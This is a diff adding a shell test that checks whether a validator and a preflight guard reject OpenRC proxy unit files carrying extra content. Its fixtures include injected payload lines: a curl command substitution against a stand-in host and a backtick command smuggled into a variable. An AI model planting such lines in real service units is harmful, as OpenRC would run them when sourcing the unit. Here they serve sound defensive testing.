@@ -313,6 +313,48 @@ MATRIX
     || fail 'symlink-to-script refusal did not name the reason'
 )
 
+# FL-6 (WI#393): openrc_proxy_unit_is_safe must check equality, not
+# presence — a unit carrying the contract line plus extra content is NOT
+# safe. Left in place it would be sourced by OpenRC without ever being
+# archived or refused. Rejected extra content: a legacy inline --tensorzero
+# flag (not -env), command substitution, or a backtick on any line.
+safe_unit="$fixture/safe-proxy-unit"
+printf '%s\n' \
+  '#!/sbin/openrc-run' \
+  '' \
+  'description="LunarWing TensorZero proxy (alice)"' \
+  '' \
+  ': "${proxy_command:=/usr/bin/python3}"' \
+  ': "${proxy_args:=/home/alice/lunarwing/tensorzero-proxy-configurations/lunarwing-proxy.py --port 23104 --bind 127.0.0.1 --tensorzero-env}"' \
+  >"$safe_unit"
+openrc_proxy_unit_is_safe "$safe_unit" \
+  || fail 'a contract-conformant proxy unit was rejected'
+for payload in \
+  ': "${proxy_args:=proxy --tensorzero http://fixture.invalid}"' \
+  'proxy_note="$(curl -s http://fixture.invalid/payload)"' \
+  'proxy_note=`id`'
+do
+  cp "$safe_unit" "$fixture/extra-proxy-unit"
+  printf '%s\n' "$payload" >>"$fixture/extra-proxy-unit"
+  if openrc_proxy_unit_is_safe "$fixture/extra-proxy-unit"; then
+    fail "safe-line-plus-extra-content unit classified safe: $payload"
+  fi
+done
+# The preflight guard is the boundary that keeps OpenRC from sourcing an
+# installed unit: it must accept a contract-conformant unit and refuse the
+# same unit once extra content rides along (no proxy units exist in the
+# fixture init.d at this point, so the payload unit is the only one).
+cp "$safe_unit" "$OPENRC_INITD_DIR/lunarwing-proxy-alice"
+require_safe_openrc_proxy_units \
+  || fail 'a contract-conformant installed unit failed the preflight guard'
+printf '%s\n' 'proxy_note=`id`' >>"$OPENRC_INITD_DIR/lunarwing-proxy-alice"
+rc=0
+( require_safe_openrc_proxy_units ) >"$fixture/refused.log" 2>&1 || rc=$?
+[[ "$rc" == 125 ]] || fail 'safe-line-plus-payload unit passed the preflight guard'
+grep -Fq 'render-units --all-proxies' "$fixture/refused.log" \
+  || fail 'preflight refusal omitted the repair command'
+rm -f -- "$OPENRC_INITD_DIR/lunarwing-proxy-alice"
+
 # FL-4 (M3): enable-health-fleet sources mt-admin directly, bypassing main's
 # preflight, so it carries its own proxy-unit guard — a legacy unit must
 # refuse before the root health cron is armed in the migration window. The id
